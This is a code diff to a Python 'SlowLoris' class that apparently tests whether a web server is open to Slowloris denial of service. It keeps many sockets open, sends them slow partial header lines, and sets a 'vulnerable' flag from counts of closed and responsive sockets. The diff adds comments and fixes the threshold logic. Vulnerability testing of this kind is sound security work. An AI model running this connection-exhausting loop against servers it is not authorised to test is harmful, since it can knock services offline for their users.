@@ -53,13 +53,16 @@ class SlowLoris:
             while self.testing:
 
                 for sock in list(self.sockets):
-                                
+                
                     try:
+                        #send test data
                         sock.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
                         self.responsiveSockets += 1
                                     
                     except socket.error:
+                        #if socket is closed
                         self.sockets.remove(sock)
+                        self.closedSockets += 1 
 
                 for i in range(int(self.socketsNum) - len(self.sockets)):
 
@@ -71,15 +74,17 @@ class SlowLoris:
                             self.sockets.append(sock)
                                         
                     except socket.error:
-                        self.closedSockets += 1    
+                        self.closedSockets += 1
                                     
 
-                if self.closedSockets == (int(self.socketsNum) / 2):
-                    self.vulnerable == False
+                #if past not vulnerable threshold
+                if self.closedSockets >= (int(self.socketsNum) / 2):
+                    self.vulnerable = False
                     self.testing = False
                     break
-                                        
-                if self.responsiveSockets > (int(self.socketsNum) * 2):
+
+                #if past vulnerable threshold                      
+                if self.responsiveSockets >= (int(self.socketsNum) * 2):
                     self.vulnerable = True
                     self.testing = False
                     break
